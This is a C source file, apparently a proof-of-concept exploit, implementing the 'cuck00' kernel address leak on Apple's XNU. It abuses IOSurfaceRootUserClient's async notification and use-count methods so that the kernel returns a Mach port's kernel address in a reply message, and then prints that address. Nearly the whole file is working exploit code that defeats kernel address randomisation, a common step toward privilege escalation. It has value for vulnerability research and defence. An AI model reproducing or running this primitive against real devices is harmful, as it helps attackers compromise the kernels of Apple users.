#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <sched.h> 

#include "iosurface.h"
#include "iokit.h"
#include "helper.h"

// Kernel Page Size.
extern mach_vm_size_t pagesize;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

const uint32_t IOSURFACE_INCREMENT_USE_COUNT = 14;
const uint32_t IOSURFACE_DECREMENT_USE_COUNT = 15;
const uint32_t IOSURFACE_SET_NOTIFY          = 17;

//https://github.com/apple-oss-distributions/xnu/blob/xnu-6153.61.1/iokit/Kernel/IOUserClient.cpp
enum{
	kIOUCAsync0Flags          = 3ULL,
	kIOUCAsync64Flag          = 1ULL,
	kIOUCAsyncErrorLoggedFlag = 2ULL
};

uint64_t find_port_via_cuck00(mach_port_t port) {
    uint64_t A = 0x4141414141414141;
    uint64_t refs[8] = {A,A,A,A,A,A,A,A};
    uint64_t in[3] = {0,0,0};
    uint64_t id = IOSurface_id;

    if (IOConnectCallAsyncStructMethod(IOSurfaceRootUserClient, IOSURFACE_SET_NOTIFY, port, refs, 8, in, sizeof(in), NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSURFACE_INCREMENT_USE_COUNT, &id, 1, NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSURFACE_DECREMENT_USE_COUNT, &id, 1, NULL, NULL)) return 0;

    typedef uint64_t io_user_reference_t;
    typedef io_user_reference_t OSAsyncReference64[8];

    //https://github.com/apple-oss-distributions/xnu/blob/xnu-6153.61.1/iokit/IOKit/OSMessageNotification.h#L94
    struct OSNotificationHeader64 {
    	mach_msg_size_t     size;       /* content size */
    	natural_t           type;
    	OSAsyncReference64  reference;
        unsigned char       content[];
    };

    //https://github.com/apple-oss-distributions/xnu/blob/xnu-6153.61.1/iokit/IOKit/OSMessageNotification.h
    struct IOAsyncCompletionContent {
	    kern_return_t result;
        void * args[] __attribute__ ((packed));
    };

    //https://github.com/apple-oss-distributions/xnu/blob/xnu-6153.61.1/iokit/Kernel/IOUserClient.cpp#L2033
    struct ReplyMsg {
		mach_msg_header_t msgHdr;
		struct{
			struct OSNotificationHeader64   notifyHdr;
			struct IOAsyncCompletionContent asyncContent;
			io_user_reference_t      args[16] __attribute__ ((packed));
		} msg64;
	};
    struct ReplyMsg      replyMsg;
    
    if (mach_msg(&replyMsg.msgHdr, MACH_RCV_MSG, 0, sizeof(replyMsg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)) return 0;
    return replyMsg.msg64.notifyHdr.reference[0] & ~kIOUCAsync0Flags;
}


int main(int argc, char *argv[], char *envp[]) {
    IOSurface_init();

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t  ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    INFO("port: 0x%x, %s\n", port, mach_error_string(ret));

    uint64_t leaked_port_addr = find_port_via_cuck00(port);
    INFO("leaked_port_addr: 0x%llx\n", leaked_port_addr);

    getchar();

    mach_port_destroy(mach_task_self(), port);    

    IOSurface_deinit();

    return 0;
}